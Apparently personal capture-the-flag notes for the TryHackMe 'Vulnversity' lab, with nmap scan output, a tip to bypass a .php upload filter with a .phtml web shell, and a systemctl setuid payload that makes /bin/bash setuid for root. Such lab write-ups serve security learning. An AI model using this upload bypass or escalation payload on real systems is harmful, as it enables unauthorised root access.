<!--
  ____   __  ____  __
 (  _ \ /. |(  _ \/  )
  )___/(_  _))___/ )(
 (__)    (_)(__)  (__)

FileName: Vulniversity.md
Link: https://tryhackme.com/room/vulnversity

-->
# Vulniversity.md
Ip: x.x.x.x

## Scans
```bash
nmap -sV x.x.x.x

Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-21 02:12 CEST
Nmap scan report for 10.10.76.153
Host is up (0.022s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.18 seconds
```

```bash
nmap --script vuln x.x.x.x

Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-21 02:12 CEST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.76.153
Host is up (0.022s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
|_sslv2-drown:
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos:
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_

Nmap done: 1 IP address (1 host up) scanned in 45.20 seconds
```

## Services / Versions
ftp         vsftpd 3.0.3
ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
http-proxy  Squid http proxy 3.5.12
http        Apache httpd 2.4.18 ((Ubuntu))
PHP Version 7.0.33-0ubuntu0.16.04.5

## Research
/internal/

## Information
Can't upload .php files
Upload custom shell .phtml
set tty to raw echo: stty raw -echo

## Credentials

### Root:
 - user: <..>
 - pass: <..>

## Privesc

### Setuid: gtfobins
systemctl

payload:
>TF=$(mktemp).service
>echo '[Service]
>Type=oneshot
>ExecStart=/bin/sh -c "chmod +s /bin/bash"
>[Install]
>WantedBy=multi-user.target' > $TF
>/bin/systemctl link $TF
>/bin/systemctl enable --now $TF

